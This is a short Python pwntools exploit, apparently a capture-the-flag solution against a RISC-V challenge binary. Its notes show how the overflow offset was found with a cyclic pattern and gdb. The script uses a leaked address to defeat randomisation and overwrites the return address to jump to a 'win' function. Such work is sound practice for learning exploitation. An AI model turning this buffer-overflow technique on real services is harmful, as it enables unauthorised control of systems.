"""
cyclic 300 -n=8 | qemu-riscv64 -g 1234 -L /usr/riscv64-linux-gnu docker/riscy_business

gdb docker/riscy_business
target remote localhost:1234
break *main+68
continue
print $ra
> 0x6261616161616169
"""

from pwn import *

elf = ELF("docker/riscy_business")

#p = process(["qemu-riscv64", "-L", "/usr/riscv64-linux-gnu", "./docker/riscy_business"])
p = remote("localhost", 40035)

main = int(p.readline().split(b"0x")[1].split(b",")[0], 16)
elf.address = main - elf.sym.main
print(elf.sym.win)

offset = cyclic_find(0x6261616161616169, n=8)

payload = b"a" * offset + p64(elf.sym.win)
p.sendline(payload)

p.readline()
print(p.readall().decode('utf-8').strip())
